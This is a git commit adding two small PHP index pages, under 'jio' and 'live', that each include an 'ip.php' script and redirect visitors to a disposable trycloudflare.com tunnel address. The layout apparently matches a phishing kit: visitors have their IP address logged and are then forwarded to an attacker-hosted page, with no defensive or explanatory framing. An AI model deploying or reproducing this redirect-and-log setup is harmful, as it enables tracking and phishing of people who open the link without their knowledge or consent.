7c897daed4e48f7b2c1c0423d19bf05c71120b36
Arynz&Clem <68093214+ArynzClem@users.noreply.github.com>
2022-10-23 19:29:47 +0700

    Add files via upload

---
+++ jio/index.php
@@ -0,0 +1,5 @@
+<?php
+include 'ip.php';
+header('Location: https://goes-excluded-jp-majority.trycloudflare.com/index2.html');
+exit
+?>
---
+++ live/index.php
@@ -0,0 +1,5 @@
+<?php
+include 'ip.php';
+header('Location: https://leeds-marker-event-arg.trycloudflare.com/index2.html');
+exit
+?>
